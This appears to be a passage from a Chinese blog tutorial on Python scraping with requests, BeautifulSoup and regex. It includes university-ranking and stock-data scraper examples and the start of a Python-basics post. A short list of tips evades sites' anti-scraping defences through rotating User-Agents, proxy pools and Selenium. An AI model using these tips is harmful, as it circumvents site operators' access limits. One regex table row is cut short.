<h3 id="搜索文档树"><a href="#搜索文档树" class="headerlink" title="搜索文档树"></a>搜索文档树</h3><h4 id="find-all"><a href="#find-all" class="headerlink" title="find_all()"></a>find_all()</h4><p>find_all 是用于搜索节点中所有符合过滤条件的节点，它支持的过滤器的类型有:<code>字符串，正则表达式，列表，True，方法</code>。find_all 的参数为：<code>find_all( name , attrs , recursive , text , **kwargs )</code></p>
<p>代码示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="comment">#导入BeautifulSoup,注意大小写</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.baidu.com'</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">r.encoding = r.apparent_encoding</span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#name参数：可以查找所有名字为name的tag, 字符串对象会被自动忽略掉</span></span><br><span class="line">p = soup.find_all(<span class="string">"p"</span>)</span><br><span class="line">print(p)</span><br><span class="line">print()</span><br><span class="line"><span class="comment">#keyword参数：对标签属性值的检索字符串，可标注属性检索</span></span><br><span class="line">p = soup.find_all(id=<span class="string">'lh'</span>)</span><br><span class="line"><span class="comment">#注意有些属性在python中属于关键字，需要处理。例如class，传参时用class_(加了下划线)</span></span><br><span class="line">p2 = soup.find_all(class_=<span class="string">'bri'</span>)</span><br><span class="line">print(p)</span><br><span class="line">print(p2)</span><br><span class="line"><span class="comment">#有些属性不能通过以上方法直接搜索，比如html5中的data-*属性</span></span><br><span class="line"><span class="comment">#不过可以通过attrs参数指定一个字典参数来搜索包含特殊属性的标签</span></span><br><span class="line"><span class="comment">#如：soup.find_all(attrs=&#123;"data-foo": "value"&#125;)</span></span><br><span class="line">print()</span><br><span class="line"><span class="comment">#text参数：检索文档中的字符串内容, 与 name 参数的可选值一样,text参数接受 字符串,正则表达式,列表,True</span></span><br><span class="line">p = soup.find_all(text=<span class="string">"百度一下，你就知道"</span>)</span><br><span class="line">print(p)</span><br><span class="line">print()</span><br><span class="line"><span class="comment">#limit参数:限制返回结果的数量, 效果与SQL中的limit关键字类似</span></span><br><span class="line">p = soup.find_all(<span class="string">"p"</span>,limit=<span class="number">1</span>)</span><br><span class="line">print(p)</span><br><span class="line">print()</span><br><span class="line"><span class="comment">#recursive 参数:是否对子孙全部检索，默认为True</span></span><br><span class="line">p = soup.html.find_all(<span class="string">"title"</span>, recursive=<span class="literal">False</span>)</span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure>

<h4 id="扩展方法"><a href="#扩展方法" class="headerlink" title="扩展方法"></a>扩展方法</h4><table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>&lt;&gt;.find()</td>
<td>搜索且只返回一个结果，字符串类型，同find_all()参数</td>
</tr>
<tr>
<td>&lt;&gt;.parents()</td>
<td>在先辈节点中搜索，返回列表类型，同find_all()参数</td>
</tr>
<tr>
<td>&lt;&gt;.parent()</td>
<td>在先辈节点中返回一个结果，字符串类型，同find()参数</td>
</tr>
<tr>
<td>&lt;&gt;.find_next_sibling()</td>
<td>在后序平行节点中返回一个结果，字符串类型，同find()参数</td>
</tr>
<tr>
<td>&lt;&gt;.find_next_siblings()</td>
<td>在后序平行节点中搜索，返回列表，同find_all()参数</td>
</tr>
<tr>
<td>&lt;&gt;.find_previous_sibling()</td>
<td>在前序平行节点中返回一个结果，字符串类型，同find()参数</td>
</tr>
<tr>
<td>&lt;&gt;.find_previous_siblings()</td>
<td>在前续平行节点中搜索，返回列表，同find_all()参数</td>
</tr>
</tbody></table>
<h4 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h4><p>这就是另一种与 find_all 方法有异曲同工之妙的查找方法.</p>
<p>写 CSS 时，标签名不加任何修饰，类名前加<code>.</code>，id名前加<code>#</code>，在这里我们也可以利用类似的方法来筛选元素，用到的方法是 <code>soup.select()</code>，返回类型是 <code>list</code></p>
<p>代码示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://www.baidu.com'</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">r.encoding = r.apparent_encoding</span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line"><span class="comment">#通过标签名查找</span></span><br><span class="line">print(soup.select(<span class="string">'head'</span>))</span><br><span class="line">print(<span class="string">'='</span>*<span class="number">50</span>)</span><br><span class="line"><span class="comment">#通过类名查找</span></span><br><span class="line">print(soup.select(<span class="string">'.fm'</span>))   <span class="comment">#注意.号</span></span><br><span class="line">print(<span class="string">'='</span>*<span class="number">50</span>)</span><br><span class="line"><span class="comment">#通过id名查找</span></span><br><span class="line">print(soup.select(<span class="string">'#cp'</span>))       <span class="comment">#注意#号</span></span><br><span class="line"><span class="comment">#组合查找</span></span><br><span class="line">print(<span class="string">'='</span>*<span class="number">50</span>)</span><br><span class="line">print(soup.select(<span class="string">'p#cp'</span>))</span><br><span class="line"><span class="comment">#组合查找2</span></span><br><span class="line">print(<span class="string">'='</span>*<span class="number">50</span>)</span><br><span class="line">print(soup.select(<span class="string">'form[class=fm]'</span>))</span><br></pre></td></tr></table></figure>

<h3 id="requests-bs4爬虫实例"><a href="#requests-bs4爬虫实例" class="headerlink" title="requests-bs4爬虫实例"></a>requests-bs4爬虫实例</h3><h4 id="实例1-大学排名信息爬虫"><a href="#实例1-大学排名信息爬虫" class="headerlink" title="实例1:大学排名信息爬虫"></a>实例1:大学排名信息爬虫</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#链接：http://www.zuihaodaxue.cn/zuihaodaxuepaiming2016.html</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="comment">#获取网页内容</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillUnivList</span><span class="params">(ulist, html)</span>:</span>  <span class="comment">#提取信息</span></span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)   <span class="comment">#创建beautifulsoup对象</span></span><br><span class="line">    <span class="comment">#print(soup.find('tbody'))</span></span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">'tbody'</span>).children:</span><br><span class="line">        <span class="keyword">if</span> isinstance(tr, bs4.element.Tag): <span class="comment">#isinstance()函数来判断一个对象是否是一个已知的类型</span></span><br><span class="line">            tds = tr(<span class="string">'td'</span>)                  <span class="comment">#将一行的数据存入列表</span></span><br><span class="line">            ulist.append([tds[<span class="number">0</span>].string, tds[<span class="number">1</span>].string, tds[<span class="number">3</span>].string]) <span class="comment">#将排名，学校名称，总分提取出来</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printUnivList</span><span class="params">(ulist, num)</span>:</span></span><br><span class="line">    <span class="comment">#打印排版</span></span><br><span class="line">    tplt = <span class="string">"&#123;0:&lt;10&#125;\t&#123;1:&#123;3&#125;&lt;10&#125;\t&#123;2:&lt;10&#125;"</span>   <span class="comment">#格式化字符串</span></span><br><span class="line">    print(tplt.format(<span class="string">"排名"</span>,<span class="string">"学校名称"</span>,<span class="string">"总分"</span>,chr(<span class="number">12288</span>))) <span class="comment">#chr(12288)为全角空格，利于中文对齐</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        u=ulist[i]</span><br><span class="line">        print(tplt.format(u[<span class="number">0</span>],u[<span class="number">1</span>],u[<span class="number">2</span>],chr(<span class="number">12288</span>)))</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    uinfo = []</span><br><span class="line">    url = <span class="string">'http://www.zuihaodaxue.cn/zuihaodaxuepaiming2016.html'</span></span><br><span class="line">    html = getHTMLText(url)</span><br><span class="line">    fillUnivList(uinfo, html)</span><br><span class="line">    printUnivList(uinfo, <span class="number">20</span>) <span class="comment"># 指定前20</span></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h4 id="实例2：股票数据定向爬虫"><a href="#实例2：股票数据定向爬虫" class="headerlink" title="实例2：股票数据定向爬虫"></a>实例2：股票数据定向爬虫</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re   <span class="comment">#正则表达式需要</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span><span class="params">(url, code=<span class="string">"utf-8"</span>)</span>:</span></span><br><span class="line">    <span class="string">'获取页面内容'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = code</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"连接失败"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getStockList</span><span class="params">(lst, stockURL)</span>:</span></span><br><span class="line">    <span class="string">'获取股票列表'</span></span><br><span class="line">    html = getHTMLText(stockURL, <span class="string">"GB2312"</span>)</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">'html.parser'</span>) </span><br><span class="line">    a = soup.find_all(<span class="string">'a'</span>)</span><br><span class="line">    <span class="comment">#从超链接中提取股票号码</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            href = i.attrs[<span class="string">'href'</span>]</span><br><span class="line">            lst.append(re.findall(<span class="string">r"[s][hz]\d&#123;6&#125;"</span>, href)[<span class="number">0</span>])    <span class="comment">#正则表达式匹配</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getStockInfo</span><span class="params">(lst, stockURL, fpath)</span>:</span></span><br><span class="line">    <span class="comment">#获取股票信息</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> stock <span class="keyword">in</span> lst:</span><br><span class="line">        url = stockURL + stock + <span class="string">".html"</span>    <span class="comment">#拼接详情连接</span></span><br><span class="line">        html = getHTMLText(url)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> html==<span class="string">""</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            infoDict = &#123;&#125;</span><br><span class="line">            soup = BeautifulSoup(html, <span class="string">'html.parser'</span>)</span><br><span class="line">            <span class="comment">##获取股票名称</span></span><br><span class="line">            stockInfo = soup.find(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'stock-bets'</span>&#125;)</span><br><span class="line">            name = stockInfo.find_all(attrs=&#123;<span class="string">'class'</span>:<span class="string">'bets-name'</span>&#125;)[<span class="number">0</span>]</span><br><span class="line">            infoDict.update(&#123;<span class="string">'股票名称'</span>: name.text.split()[<span class="number">0</span>]&#125;)</span><br><span class="line">            <span class="comment">#获取股票详情 </span></span><br><span class="line">            keyList = stockInfo.find_all(<span class="string">'dt'</span>)</span><br><span class="line">            valueList = stockInfo.find_all(<span class="string">'dd'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(keyList)):</span><br><span class="line">                key = keyList[i].text</span><br><span class="line">                val = valueList[i].text</span><br><span class="line">                infoDict[key] = val</span><br><span class="line">            <span class="comment">#写入文件，并显示进度 </span></span><br><span class="line">            <span class="keyword">with</span> open(fpath, <span class="string">'a'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(str(infoDict) + <span class="string">'\n'</span> )</span><br><span class="line">                count = count + <span class="number">1</span></span><br><span class="line">                print(<span class="string">"\r当前进度: &#123;:.2f&#125;%"</span>.format(count*<span class="number">100</span>/len(lst)),end=<span class="string">""</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            count = count + <span class="number">1</span></span><br><span class="line">            print(<span class="string">"\r当前进度: &#123;:.2f&#125;%"</span>.format(count*<span class="number">100</span>/len(lst)),end=<span class="string">""</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    stock_list_url = <span class="string">'http://quote.eastmoney.com/stocklist.html'</span></span><br><span class="line">    stock_info_url = <span class="string">'http://gupiao.baidu.com/stock/'</span></span><br><span class="line">    output_file = <span class="string">'output.txt'</span></span><br><span class="line">    slist=[]</span><br><span class="line">    getStockList(slist, stock_list_url)</span><br><span class="line">    getStockInfo(slist, stock_info_url, output_file)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="常用操作符"><a href="#常用操作符" class="headerlink" title="常用操作符"></a>常用操作符</h3><table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>.</td>
<td>表示任意单个字符</td>
</tr>
<tr>
<td>[ ]</td>
<td>字符集，对单个字符给出取值范围</td>
</tr>
<tr>
<td>[^ ]</td>
<td>非字符集，对单个字符给出排除范围</td>
</tr>
<tr>
<td>*</td>
<td>前一个字符0次或无限次扩展</td>
</tr>
<tr>
<td>+</td>
<td>前一个字符1次或无限次扩展</td>
</tr>
<tr>
<td>?</td>
<td>前一个字符0次或1次扩展</td>
</tr>
<tr>
<td>|</td>
<td>左右表达式任意一个</td>
</tr>
<tr>
<td>{m}</td>
<td>扩展前一个字符m次</td>
</tr>
<tr>
<td>{m,n}</td>
<td>扩展前一个字符m至n次（含n）</td>
</tr>
<tr>
<td>^</td>
<td>匹配字符串开头</td>
</tr>
<tr>
<td>$</td>
<td>匹配字符串结尾</td>
</tr>
<tr>
<td>()</td>
<td>分组标记，内部只能用`</td>
</tr>
<tr>
<td>\d</td>
<td>数字，等价于[0-9]</td>
</tr>
<tr>
<td>\w</td>
<td>单词字符，等价于[A-Za-z0-9]</td>
</tr>
</tbody></table>
<p>re库默认采用贪婪匹配，要使用最小匹配，操作符如下：</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>*?</td>
<td>前一个字符0次或无限次扩展，最小匹配</td>
</tr>
<tr>
<td>+?</td>
<td>前一个字符1次或无限次扩展，最小匹配</td>
</tr>
<tr>
<td>??</td>
<td>前一个字符0次或1次扩展，最小匹配</td>
</tr>
<tr>
<td>{m,n}?</td>
<td>扩展前一个字符m至n次(含n)，最小匹配</td>
</tr>
</tbody></table>
<h3 id="re库"><a href="#re库" class="headerlink" title="re库"></a>re库</h3><h4 id="re库主要功能函数"><a href="#re库主要功能函数" class="headerlink" title="re库主要功能函数"></a>re库主要功能函数</h4><table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
<th>参数</th>
</tr>
</thead>
<tbody><tr>
<td>re.search()</td>
<td>在一个字符串中搜索匹配正则表达式的第一个位置，返回match对象</td>
<td>re.search(pattern,string,flags=0)</td>
</tr>
<tr>
<td>re.match()</td>
<td>从一个字符串的开始位置起匹配正则表达式，返回match对象</td>
<td>re.match(pattern,string,flags=0)</td>
</tr>
<tr>
<td>re.findall()</td>
<td>搜索字符串，以列表类型返回全部能匹配到的子串</td>
<td>re.findall(pattern,string,flags=0)</td>
</tr>
<tr>
<td>re.split()</td>
<td>将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</td>
<td>re.split(pattern,string,maxsplit=0,flags=0)</td>
</tr>
<tr>
<td>re.finditer()</td>
<td>搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素都是match对象</td>
<td>re.finditer(pattern,string,flags=0)</td>
</tr>
<tr>
<td>re.sub()</td>
<td>在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</td>
<td>re.sub(pattern,repl,string,count=0,flags=0)</td>
</tr>
</tbody></table>
<p>参数解释：</p>
<ul>
<li>pattern - 正则表达式的字符串或原生字符串的表示</li>
<li>string - 待匹配的字符串</li>
<li>flags - 控制标记</li>
<li>maxsplit - 最大分割数，剩余部分作为一个元素输出</li>
<li>repl - 用于替换的子字符串</li>
<li>count - 匹配的最大替换次数</li>
</ul>
<p>控制标记(flags)：</p>
<table>
<thead>
<tr>
<th>flags</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>re.I</td>
<td>忽略正则表达式的大小写，[A-Z]可匹配小写字符</td>
</tr>
<tr>
<td>re.M</td>
<td>正则中的^可将给定字符串的每行当做匹配的开始</td>
</tr>
<tr>
<td>re.S</td>
<td>正则表达式中的点（.）操作符匹配所有字符，默认不匹配换行</td>
</tr>
</tbody></table>
<p><strong>另一种等价用法</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>rst = re.search(<span class="string">r'[1-9]\d&#123;5&#125;'</span>, <span class="string">'BIT 100081'</span>)	<span class="comment"># 一次性操作</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pat = re.compile(<span class="string">r'[1-9]\d&#123;5&#125;'</span>)		<span class="comment"># 编译后多次操作</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rst = pat.search(<span class="string">'BIT 100081'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="match对象"><a href="#match对象" class="headerlink" title="match对象"></a>match对象</h4><ul>
<li>match对象的属性</li>
</ul>
<table>
<thead>
<tr>
<th>属性</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>.string</td>
<td>待匹配的文本</td>
</tr>
<tr>
<td>.re</td>
<td>匹配时使用的pattern对象（正则表达式）</td>
</tr>
<tr>
<td>.pos</td>
<td>正则表达式搜索文本的开始位置</td>
</tr>
<tr>
<td>.endpos</td>
<td>正则表达式搜索文本的结束位置</td>
</tr>
</tbody></table>
<ul>
<li>match对象的方法 </li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>.group(0)</td>
<td>获得匹配后的字符串</td>
</tr>
<tr>
<td>.start()</td>
<td>匹配字符串在原始字符串的开始位置</td>
</tr>
<tr>
<td>.end()</td>
<td>匹配字符串在原始字符串的结束位置</td>
</tr>
<tr>
<td>.span()</td>
<td>返回(.start(),.end())</td>
</tr>
</tbody></table>
<h2 id="反反爬策略"><a href="#反反爬策略" class="headerlink" title="反反爬策略"></a>反反爬策略</h2><p>常见的反爬虫策略：检查User-Agent，检查访问频率，封掉异常IP，设置验证码，Ajax异步加载</p>
<p>相对应的策略：</p>
<ul>
<li><p>动态修改UA头</p>
</li>
<li><p>修改爬虫访问周期</p>
</li>
<li><p>使用代理池</p>
</li>
<li><p>模仿自然人行为：selenium</p>
</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>python编程基础</title>
    <url>/2020/04/19/python%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="如何写-Python-程序"><a href="#如何写-Python-程序" class="headerlink" title="如何写 Python 程序"></a>如何写 Python 程序</h2><ol>
<li>打开你喜欢的编辑器。</li>
<li>键入例子中给出的程序代码。</li>
<li>用注释中给的文件名来保存文件，我保持将所有 Python 程序保存成扩展名为.py 的习惯。</li>
<li>用带命令行解释器运行.py 程序，或者用 IDLE 运行程序。也可以用前面提到的执行方式。</li>
</ol>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>通过用自己熟悉的语言，在程序中对某些代码进行标注说明，这就是注释的作用，能够大大增强程序的可读性</p>
<p>单行注释以<code>#</code>开头或<code>&#39;</code>包裹，多行注释用<code>&#39;&#39;&#39;</code>或<code>&quot;&quot;&quot;</code>包裹，即单独的字符串被视为注释</p>
<p>注释的内容不当做程序运行，起辅助说明作用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这是一个注释</span></span><br><span class="line"><span class="string">'这是一个注释'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">这是一个多行注释</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">这也是一个多行注释</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<p>编码注释：在程序的开头写入如下代码，即告知程序以utf-8编码(中文)执行，这是python语法规范推荐的方式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br></pre></td></tr></table></figure>

<h2 id="标识符与关键字"><a href="#标识符与关键字" class="headerlink" title="标识符与关键字"></a>标识符与关键字</h2><ul>
<li>标识符</li>
</ul>
<p>标识符的第一个字符必须是字母表中的字母（大写或小写）或者一个下划线<code>_</code>,其他部分可以由字母（大写或小写）、下划线或数字（0-9）组成。</p>
<p>标识符名称是对大小写敏感的。例如， myname 和 myName 不是一个标识符。</p>
<ul>
<li>关键字</li>
</ul>
<p>关键字是python已经使用的了的标识符，不允许开发者自己定义和关键字相同的名字的标示符。</p>
<h2 id="逻辑行和物理行"><a href="#逻辑行和物理行" class="headerlink" title="逻辑行和物理行"></a>逻辑行和物理行</h2><p>物理行是你在编写程序时所看见的。逻辑行是 Python 看见的单个语句。 Python 假定每个物理行对应一个逻辑行。如果你想要在一个物理行中使用多于一个逻辑行，那么你需要使用分号（;）来特别地标明这种用法。分号表示一个逻辑行/语句的结束。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">5</span></span><br><span class="line">print(i)		<span class="comment">#两个物理行，两个逻辑行</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">5</span>;</span><br><span class="line">print(i);		<span class="comment">#两个物理行，两个逻辑行</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">5</span>;print(i);	<span class="comment">#一个物理行，两个逻辑行</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'hel\</span></span><br><span class="line"><span class="string">lo'</span>)			<span class="comment">#两个物理行，一个逻辑行</span></span><br></pre></td></tr></table></figure>

<h2 id="缩进"><a href="#缩进" class="headerlink" title="缩进"></a>缩进</h2><p>在 Python 中空白非常重要。实际上，在每行开头的空白很重要。称之为缩进。在行首的主要的空白（空格键和制表符）用来决定逻辑行缩进的层次，从而来决定语句分组。同一层次的语句必须有相同的缩进。每一组这样的语句称为一个块。错误的缩进会引发错误。</p>
<p>不要混合使用制表符和空格来缩进，因为这在跨越不同的平台的时候，无法正常工作。我强烈建<br>议你在每个缩进层次使用单个制表符或两个或四个空格。选择这三种缩进风格之一。更加重要的<br>是，选择一种风格，然后一贯地使用它，即只使用这一种风格。</p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量就是我们想要的东西——它们的值可以变化，即你可以使用变量存储任何东西。变量只是你的计算机中存储信息的一部分内存。</p>
<p>变量使用标识符命名，使用变量时只需要给它们赋一个值。不需要声明或定义数据类型。</p>
<p>动态变量名:<code>exec(&#39;var{} = {}&#39;.format(i, i))</code></p>
<p><strong>locals()</strong> 函数会以字典类型返回当前位置的全部局部变量。</p>
<p>exec语句用来执行储存在字符串或文件中的Python语句</p>
<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">12</span>	</span><br><span class="line">y = <span class="number">2</span>+x</span><br><span class="line">print(x)</span><br><span class="line">print(y)</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">12</span><br><span class="line">14</span><br></pre></td></tr></table></figure>

<p>变量可以有不同类型的值，称之为数据类型。基本数据类型是数字和字符串。</p>
<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>链接：<a href="https://www.cnblogs.com/fat39/p/7159881.html" target="_blank" rel="noopener">格式化输出详解</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#普通输出</span></span><br><span class="line">a = <span class="string">'hello world'</span></span><br><span class="line">print(<span class="string">'hello world'</span>)</span><br><span class="line">print(a)</span><br><span class="line"><span class="comment">#格式化输出</span></span><br><span class="line">print(<span class="string">"python says:%s"</span>%a)</span><br><span class="line">print(<span class="string">"python says:&#123;0&#125;"</span>.format(a))</span><br><span class="line"><span class="comment">#字符串格式化</span></span><br><span class="line">print(<span class="string">"python says:%10s"</span>%a)		<span class="comment">#右对齐，占位符10位</span></span><br><span class="line">print(<span class="string">"python says:%-10s"</span>%a)	<span class="comment">#左对齐，占位符10位</span></span><br><span class="line">print(<span class="string">"python says:%.2s"</span>%a)		<span class="comment">#截取2位字符串</span></span><br><span class="line">print(<span class="string">"python says:%10.2s"</span>%a)	<span class="comment">#10位占位符，截取两位字符串</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>格式符号</th>
<th>转换</th>
</tr>
</thead>
<tbody><tr>
<td>%c</td>
<td>字符</td>
</tr>
<tr>
<td>%s</td>
<td>通过str() 字符串转换来格式化</td>
</tr>
<tr>
<td>%i</td>
<td>有符号十进制整数</td>
</tr>
<tr>
<td>%d</td>
<td>有符号十进制整数</td>
</tr>
<tr>
<td>%u</td>
<td>无符号十进制整数</td>
</tr>
<tr>
<td>%o</td>
<td>八进制整数</td>
</tr>
<tr>
<td>%x</td>
<td>十六进制整数（小写字母）</td>
</tr>
<tr>
<td>%X</td>
<td>十六进制整数（大写字母）</td>
</tr>
<tr>
<td>%e</td>
<td>科学计数法（小写’e’）</td>
</tr>
<tr>
<td>%E</td>
<td>科学计数法（大写“E”）</td>
</tr>
<tr>
<td>%f</td>
<td>浮点实数</td>
</tr>
<tr>
<td>%g</td>
<td>％f和％e 的简写</td>
</tr>
<tr>
<td>%G</td>
<td>％f和％E的简写</td>
</tr>
</tbody></table>
<h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = input(<span class="string">"请输入:"</span>)</span><br></pre></td></tr></table></figure>

<ol>
<li><p>小括号中放入的是提示信息，用来在获取数据之前给用户的一个简单提示</p>
</li>
<li><p>在从键盘获取了数据以后，会存放到等号右边的变量中</p>
</li>
<li><p>会把用户输入的任何值都作为字符串来对待</p>
</li>
</ol>
<h1 id="操作符和表达式"><a href="#操作符和表达式" class="headerlink" title="操作符和表达式"></a>操作符和表达式</h1><h2 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>以下假设变量a为10，变量b为21：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>加 - 两个对象相加</td>
<td>a + b 输出结果 31</td>
</tr>
<tr>
<td>-</td>
<td>减 - 得到负数或是一个数减去另一个数</td>
<td>a - b 输出结果 -11</td>
</tr>
<tr>
<td>*</td>
<td>乘 - 两个数相乘或是返回一个被重复若干次的字符串</td>
<td>a * b 输出结果 210</td>
</tr>
<tr>
<td>/</td>
<td>除 - x 除以 y</td>
<td>b / a 输出结果 2.1</td>
</tr>
<tr>
<td>%</td>
<td>取模 - 返回除法的余数</td>
<td>b % a 输出结果 1</td>
</tr>
<tr>
<td>**</td>
<td>幂 - 返回x的y次幂</td>
<td>a**b 为10的21次方</td>
</tr>
<tr>
<td>//</td>
<td>取整除 - 向下取接近除数的整数</td>
<td>a//b 为 0</td>
</tr>
</tbody></table>
<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>以下假设变量a为10，变量b为20：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>==</td>
<td>等于 - 比较对象是否相等</td>
<td>(a == b) 返回 False。</td>
</tr>
<tr>
<td>!=</td>
<td>不等于 - 比较两个对象是否不相等</td>
<td>(a != b) 返回 True。</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于 - 返回x是否大于y</td>
<td>(a &gt; b) 返回 False。</td>
</tr>
<tr>
<td>&lt;</td>
